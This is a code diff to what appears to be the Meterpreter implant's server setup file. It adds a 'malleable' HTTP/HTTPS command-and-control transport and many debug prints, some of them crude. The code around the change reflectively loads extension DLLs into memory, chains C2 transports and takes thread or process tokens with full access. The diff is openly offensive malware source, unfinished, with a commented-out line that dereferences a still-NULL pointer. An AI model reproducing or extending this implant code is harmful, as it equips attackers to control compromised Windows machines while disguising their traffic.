@@ -10,6 +10,9 @@
 #include "win/server_transport_named_pipe.h"
 #include "../../common/packet_encryption.h"
 
+// Timo
+#include "win/server_transport_winhttp_malleable.h"
+
 extern Command* extensionCommands;
 
 // include the Reflectiveloader() function
@@ -74,12 +77,16 @@ VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensi
 {
 	while (stagelessExtensions->size > 0)
 	{
+		dprintf("[TIMOHELP] 40");
 		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
 		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
+		dprintf("[TIMOHELP] 41");
 		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
+		dprintf("[TIMOHELP] 42");
 		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
+		dprintf("[TIMOHELP] 43");
 	}
-
+	dprintf("[TIMOHELP] 44");
 	dprintf("[SERVER] All stageless extensions loaded");
 
 	// once we have reached the end, we may have extension initializers
@@ -94,18 +101,19 @@ VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensi
 		stagelessinit_extension(extensionName, data, dataSize);
 		initData = data + dataSize;
 	}
-
+	dprintf("[TIMOHELP] 45");
 	dprintf("[SERVER] All stageless extensions initialised");
 }
 
 static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)
 {
+	dprintf("[TIMOHELP] I'M A PIECE OF SHIT AND I START THE CREATE TRANSPORT HERE");
 	Transport* transport = NULL;
 	dprintf("[TRNS] Transport claims to have URL: %S", transportCommon->url);
 	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
 	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
 	dprintf("[TRNS] Transport claims to have retry wait: %d", transportCommon->retry_wait);
-
+	
 	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
 	{
 		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);
@@ -114,14 +122,24 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 	{
 		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
 	}
+	else if (wcsncmp(transportCommon->url, L"mhttp", 5) == 0) // TIMO
+	{
+		dprintf("[TIMOHELP] 19.8");
+		//memmove(transportCommon->url, transport->url++, strlen(transport->url));
+		dprintf("[TIMOHELP] 19.9");
+		dprintf("[TIMOHELP] I'M STILL A PIECE OF SHIT AND I CREATE MALLEABLE");
+		transport = transport_create_http_malleable((MetsrvTransportHttp*)transportCommon, size);
+	}
 	else
 	{
 		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);
+		dprintf("[TIMOHELP] 20");
 	}
 
 	if (transport == NULL)
 	{
 		// something went wrong
+		dprintf("[TRNS] Transport == NULL something went wrong...");
 		return NULL;
 	}
 
@@ -140,7 +158,7 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 		remote->transport->prev_transport->next_transport = transport;
 		remote->transport->prev_transport = transport;
 	}
-
+	dprintf("[TIMOHELP] 21");
 	return transport;
 }
 
@@ -190,16 +208,17 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 {
 	DWORD totalSize = 0;
 	MetsrvTransportCommon* current = transports;
-
+	
 	// The first part of the transport is always the URL, if it's NULL, we are done.
 	while (current->url[0] != 0)
 	{
 		DWORD size;
+		dprintf("[TIMOHELP] 30");
 		if (create_transport(remote, current, &size) != NULL)
 		{
 			dprintf("[TRANS] transport created of size %u", size);
 			totalSize += size;
-
+			dprintf("[TIMOHELP] 30.1");
 			// go to the next transport based on the size of the existing one.
 			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
 		}
@@ -208,11 +227,12 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 			// This is not good
 			return FALSE;
 		}
+		
 	}
 
 	// account for the last terminating NULL wchar
 	*parsedSize = totalSize + sizeof(wchar_t);
-
+	dprintf("[TIMOHELP] 31");
 	return TRUE;
 }
 
@@ -255,7 +275,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 			sess->comms_handle.handle = t->get_handle(t);
 			dprintf("[CONFIG] Comms handle set to %p", (UINT_PTR)sess->comms_handle.handle);
 		}
-
+		dprintf("[TIMOHELP] I'M THE REAL PIECE OF SHIT AND I'M COMPARING CASES %d", t->type);
 		switch (t->type)
 		{
 			case METERPRETER_TRANSPORT_TCP:
@@ -268,7 +288,10 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 				transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe*)target);
 				break;
 			}
+			
 			case METERPRETER_TRANSPORT_HTTP:
+			case METERPRETER_TRANSPORT_HTTP_MALLEABLE:
+			case METERPRETER_TRANSPORT_HTTPS_MALLEABLE:
 			case METERPRETER_TRANSPORT_HTTPS:
 			{
 				transport_write_http_config(t, (MetsrvTransportHttp*)target);
@@ -304,7 +327,7 @@ DWORD server_setup(MetsrvConfig* config)
 	char stationName[256] = { 0 };
 	char desktopName[256] = { 0 };
 	DWORD res = 0;
-
+	
 	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
 	dprintf("[SESSION] Comms handle: %u", config->session.comms_handle);
 	dprintf("[SESSION] Expiry: %u", config->session.expiry);
@@ -353,21 +376,23 @@ DWORD server_setup(MetsrvConfig* config)
 			remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;
 
 			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
-
+			
 			DWORD transportSize = 0;
+			dprintf("[TIMOHELP] 59");
 			if (!create_transports(remote, config->transports, &transportSize))
 			{
+				dprintf("[TIMOHELP] 60 Not good!");
 				// not good, bail out!
 				SetLastError(ERROR_BAD_ARGUMENTS);
 				break;
 			}
-
+			dprintf("[TIMOHELP] 61");
 			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->session.comms_handle.handle);
 			if (remote->transport->set_handle)
 			{
 				remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
 			}
-
+			dprintf("[TIMOHELP] 62");
 			// Set up the transport creation function pointer
 			remote->trans_create = create_transport;
 			// Set up the transport removal function pointer
@@ -380,22 +405,24 @@ DWORD server_setup(MetsrvConfig* config)
 
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
-
+			dprintf("[TIMOHELP] 63");
 			// this has to be done after dispatch routine are registered
 			load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));
-
+			dprintf("[TIMOHELP] 63.5");
 			// Store our process token
 			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
 			{
 				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
+				dprintf("[TIMOHELP] 63.6");
 			}
 
 			if (scheduler_initialize(remote) != ERROR_SUCCESS)
 			{
+				dprintf("[TIMOHELP] 63.7");
 				SetLastError(ERROR_BAD_ENVIRONMENT);
 				break;
 			}
-
+			dprintf("[TIMOHELP] 64");
 			// Copy it to the thread token
 			remote->thread_token = remote->server_token;
 
